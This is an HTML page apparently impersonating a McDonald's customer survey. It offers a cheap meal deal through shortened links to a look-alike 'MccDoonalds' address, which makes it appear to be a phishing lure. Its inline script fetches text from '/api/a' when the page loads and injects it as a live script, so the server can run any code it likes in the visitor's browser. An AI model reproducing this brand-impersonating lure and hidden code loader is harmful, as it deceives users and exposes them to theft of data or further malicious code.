<!DOCTYPE html>
<html>
<head>
    <title>McSurvey</title>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/archive/4/4b/20140315092753%21McDonald%27s_logo.svg" alt="McDonald's Logo">
<body>
    <div id="api-data"></div>
    <div id="survey">
        <p>Complete the <a href="https://bit.ly/MccDoonalds" style="color: #FFBC0D; text-decoration: underline;" target="_blank">McFoodThoughts</a> Survey and get your deal</p>
        <div id="deal"> <a href="https://bit.ly/MccDoonalds" style="color: #FFBC0D; text-decoration: underline;" target="_blank">Â£1.99 Meal</a></div>
        <p>Your starting code is provided above</p>
    </div>
    <script>
        fetch('/api/a')
            .then(response => response.text())
            .then(code => {
                code = code.replace(/^"(.*)"$/, '$1');
                const script = document.createElement('script');
                script.innerHTML = code;
                document.body.appendChild(script);
            })
            .catch(error => {
                console.error('Failed to fetch code:', error);
            });
    </script>
</body>
</html>
